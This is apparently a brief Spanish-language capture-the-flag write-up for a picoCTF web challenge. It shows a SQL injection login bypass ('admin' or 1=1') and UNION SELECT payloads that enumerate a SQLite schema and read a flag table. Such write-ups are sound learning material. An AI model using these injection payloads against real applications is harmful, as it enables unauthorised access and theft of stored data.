## Descripcion
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59982/).
## Solucion
Pasamos la pantalla de login , poniendo las siguientes cadenas , usuario y password:
usuario: admin
password: admin' or 1=1; ' or 1=1;

En el campo de búsqueda, usamos, una a una , las siguientes consultas para encontrar la bandera:

`ciudad' union select 1,2,3; ciudad' union select sqlite_version(),2,3; ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,2,flag from more_table;`
## Notas

## Referencias
